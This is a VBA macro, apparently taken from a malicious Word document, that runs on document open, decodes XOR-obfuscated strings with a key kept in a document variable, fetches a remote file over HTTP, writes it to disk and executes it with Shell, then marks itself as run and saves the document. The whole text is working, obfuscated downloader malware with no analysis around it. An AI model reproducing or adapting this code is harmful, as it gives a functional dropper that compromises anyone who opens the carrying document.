Private Function func1(arg_array As Variant, arg_int As Integer)
    Dim local_str1, local_str2 As String, local3, local4
    local_str2 = ActiveDocument.Variables("ppKzr").Value()
    local_str1 = ""
    local3 = 1
    While local3 < UBound(arg_array) + 2
        local4 = local3 Mod Len(local_str2): If local4 = 0 Then local4 = Len(local_str2)
        local_str1 = local_str1 + Chr(Asc(Mid(local_str2, local4 + arg_int, 1)) Xor CInt(arg_array(local3 - 1)))
        local3 = local3 + 1
    Wend
    func1 = local_str1
End Function


Public Function func2()
    twOvwCSTPL = func1(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _
    78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _
    12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _
    9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _
    2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _
    30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _
    62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _
    1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)
    UkIWIEtqCF = func1(Array(42, 115, 2), 188)
    Dim xHttp: Set xHttp = CreateObject(func1(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))
    Dim bStrm: Set bStrm = CreateObject(func1(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))
    xHttp.Open UkIWIEtqCF, twOvwCSTPL, False
    xHttp.Send
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile func1(Array(20, 39, 81, 118, 52, 78, 11), 17), 2
    End With
    Shell (func1(Array(20, 39, 81, 118, 52, 78, 11), 17))
End Function


Private Sub Document_Open()
    If ActiveDocument.Variables("ppKzr").Value <> "toto" Then
        func2
        ActiveDocument.Variables("ppKzr").Value = "toto"
        If ActiveDocument.ReadOnly = False Then
            ActiveDocument.Save
        End If
    End If
End Sub
